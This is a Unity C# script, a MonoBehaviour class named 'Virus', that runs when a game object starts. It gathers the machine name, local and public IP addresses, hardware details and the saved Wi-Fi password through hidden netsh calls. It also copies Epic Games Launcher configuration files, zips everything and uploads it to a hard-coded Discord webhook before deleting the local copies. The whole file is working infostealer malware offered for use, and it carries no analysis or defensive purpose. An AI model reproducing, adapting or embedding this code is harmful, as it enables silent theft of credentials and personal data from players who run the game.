using System;
using System.Diagnostics; // Added for Process execution
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Net.Http;
using System.Net.Sockets;
using System.Collections;
using UnityEngine;
using UnityEngine.Networking;

public class Virus : MonoBehaviour
{
    private string tempPath = Path.GetTempPath(); // Temporary path to store files
    private string discordWebhookUrl = "https://discord.com/api/webhooks/1303804400514633838/nqNZTP-WeqPTMTniA6ImACpIB0_2LUfDUtHzObaJ-toaGv2kN4qI8timwImRGWJZW7fA"; // Your Discord webhook URL

    private void Start()
    {
        StartCoroutine(GatherAndSendInfo());
    }

    private IEnumerator GatherAndSendInfo()
    {
        // Step 1: Get the public IP address
        string publicIP = "Not available";
        UnityWebRequest ipRequest = UnityWebRequest.Get("https://api.ipify.org");
        yield return ipRequest.SendWebRequest();

        if (ipRequest.result == UnityWebRequest.Result.Success)
        {
            publicIP = ipRequest.downloadHandler.text;
        }
        else
        {
            UnityEngine.Debug.LogError("Failed to get public IP address: " + ipRequest.error);
        }

        // Step 2: Gather PC information
        string pcInfo = GetPCInfo(publicIP);
        string pcName = GetPCName();
        string pcInfoFilePath = Path.Combine(tempPath, $"{pcName}.txt");
        File.WriteAllText(pcInfoFilePath, pcInfo);
        UnityEngine.Debug.Log($"PC info saved to {pcInfoFilePath}");

        // Step 3: Gather Epic Games configuration files
        string epicPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "EpicGamesLauncher", "Saved", "Config", "Windows");
        string epicSaveToPath = Path.Combine(tempPath, "EpicGames");

        try
        {
            // Create directory for Epic Games files
            Directory.CreateDirectory(epicSaveToPath);

            // Copy Epic Games configuration files
            CopyFiles(epicPath, epicSaveToPath);

            // Step 4: Create a ZIP file with both PC info and Epic Games files
            string zipFilePath = Path.Combine(tempPath, $"{pcName}.zip");
            CreateZipWithPCInfo(pcInfoFilePath, epicSaveToPath, zipFilePath);

            // Step 5: Send the ZIP file to Discord
            StartCoroutine(SendFileToDiscord(zipFilePath));

            // Step 6: Clean up
            File.Delete(zipFilePath);
            File.Delete(pcInfoFilePath);
            Directory.Delete(epicSaveToPath, true);
        }
        catch (Exception ex)
        {
            UnityEngine.Debug.LogError($"Error in Gathering Info: {ex.Message}");
        }
    }

    private string GetPCInfo(string publicIP)
    {
        string pcName = GetPCName();
        string localIP = GetLocalIPAddress();
        string gpuInfo = GetGPUInfo();
        string osInfo = GetOSInfo();
        string cpuInfo = GetCPUInfo();
        string ramInfo = GetRAMInfo();
        string wifiInfo = GetWifiInfo(); // Get Wi-Fi information

        // Combine all the information into a single string
        string pcInfo = $"PC Name: {pcName}\n" +
                        $"Local IP Address: {localIP}\n" +
                        $"Public IP Address: {publicIP}\n" +
                        $"Wi-Fi Info: {wifiInfo}\n" +
                        $"GPU: {gpuInfo}\n" +
                        $"Operating System: {osInfo}\n" +
                        $"CPU: {cpuInfo}\n" +
                        $"RAM: {ramInfo}";

        return pcInfo;
    }

    private string GetPCName()
    {
        return Environment.MachineName;
    }

    private string GetLocalIPAddress()
    {
        string localIP = "Not available";
        try
        {
            foreach (var address in Dns.GetHostAddresses(Dns.GetHostName()))
            {
                if (address.AddressFamily == AddressFamily.InterNetwork)
                {
                    localIP = address.ToString();
                    break;
                }
            }
        }
        catch (Exception e)
        {
            UnityEngine.Debug.LogError("Error getting local IP address: " + e.Message);
        }
        return localIP;
    }

    private string GetGPUInfo()
    {
        return SystemInfo.graphicsDeviceName;
    }

    private string GetOSInfo()
    {
        return SystemInfo.operatingSystem;
    }

    private string GetCPUInfo()
    {
        return $"{SystemInfo.processorType} - {SystemInfo.processorCount} cores";
    }

    private string GetRAMInfo()
    {
        return $"{SystemInfo.systemMemorySize} MB";
    }

    private string GetWifiInfo()
    {
        string ssid = "Not available";
        string password = "Not available";

        try
        {
            // Execute the command to get Wi-Fi details
            ProcessStartInfo startInfo = new ProcessStartInfo
            {
                FileName = "netsh",
                Arguments = "wlan show interfaces",
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            using (Process process = Process.Start(startInfo))
            {
                using (StreamReader reader = process.StandardOutput)
                {
                    string result = reader.ReadToEnd();
                    ssid = ExtractSSID(result);
                    password = ExtractWifiPassword(ssid); // Retrieve the password using the SSID
                }
            }
        }
        catch (Exception e)
        {
            UnityEngine.Debug.LogError("Error retrieving Wi-Fi information: " + e.Message);
        }

        return $"SSID: {ssid}\nPassword: {password}";
    }

    private string ExtractSSID(string output)
    {
        // Example logic to extract SSID from the output
        string ssid = "Not available";
        string[] lines = output.Split(new[] { '\n' }, StringSplitOptions.RemoveEmptyEntries);
        foreach (var line in lines)
        {
            if (line.Contains("SSID"))
            {
                ssid = line.Split(':')[1].Trim();
                break;
            }
        }
        return ssid;
    }

    private string ExtractWifiPassword(string ssid)
    {
        // Execute the command to get the Wi-Fi password
        string password = "Not available";
        ProcessStartInfo startInfo = new ProcessStartInfo
        {
            FileName = "netsh",
            Arguments = $"wlan show profile name=\"{ssid}\" key=clear",
            RedirectStandardOutput = true,
            UseShellExecute = false,
            CreateNoWindow = true
        };

        using (Process process = Process.Start(startInfo))
        {
            using (StreamReader reader = process.StandardOutput)
            {
                string result = reader.ReadToEnd();
                string[] lines = result.Split(new[] { '\n' }, StringSplitOptions.RemoveEmptyEntries);
                foreach (var line in lines)
                {
                    if (line.Contains("Key Content"))
                    {
                        password = line.Split(':')[1].Trim();
                        break;
                    }
                }
            }
        }
        return password;
    }

    private void CopyFiles(string sourceDir, string destDir)
    {
        // Copy files from sourceDir to destDir
        if (Directory.Exists(sourceDir))
        {
            foreach (string file in Directory.GetFiles(sourceDir, "*.*", SearchOption.AllDirectories))
            {
                string destFile = Path.Combine(destDir, Path.GetFileName(file));
                File.Copy(file, destFile, true);
            }
        }
        else
        {
            UnityEngine.Debug.LogWarning("Epic Games directory does not exist.");
        }
    }

    // Other parts of your script remain unchanged...

    private void CreateZipWithPCInfo(string txtFilePath, string sourceDir, string zipFilePath)
    {
        try
        {
            // Create a ZIP file from the text file and Epic Games files
            using (FileStream zipToOpen = new FileStream(zipFilePath, FileMode.OpenOrCreate))
            {
                using (ZipArchive archive = new ZipArchive(zipToOpen, ZipArchiveMode.Update))
                {
                    // Add the PC info text file to the ZIP
                    archive.CreateEntryFromFile(txtFilePath, Path.GetFileName(txtFilePath));

                    // Create a folder in the ZIP for Epic Games files
                    string epicGamesFolder = "EpicGames";

                    // Add the Epic Games files to the ZIP within the dedicated folder
                    foreach (string file in Directory.GetFiles(sourceDir, "*.*", SearchOption.AllDirectories))
                    {
                        // Create relative path for each file within the EpicGames folder
                        string relativePath = Path.Combine(epicGamesFolder, Path.GetFileName(file));
                        archive.CreateEntryFromFile(file, relativePath);
                    }
                }
            }
            UnityEngine.Debug.Log($"ZIP file created at {zipFilePath}");
        }
        catch (Exception ex)
        {
            UnityEngine.Debug.LogError("Failed to create ZIP file: " + ex.Message);
        }
    }

    // Rest of your script continues...


    private IEnumerator SendFileToDiscord(string filePath)
    {
        using (var client = new HttpClient())
        {
            using (var content = new MultipartFormDataContent())
            {
                using (var fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read))
                {
                    content.Add(new StreamContent(fileStream), "file", Path.GetFileName(filePath));

                    // Send POST request to Discord webhook
                    var response = client.PostAsync(discordWebhookUrl, content).Result; // Use Result to block until the response is ready
                    response.EnsureSuccessStatusCode(); // Throw if not a success code

                    UnityEngine.Debug.Log("File sent successfully to Discord.");
                }
            }
        }

        yield return null; // Needed to match the IEnumerator return type
    }
}
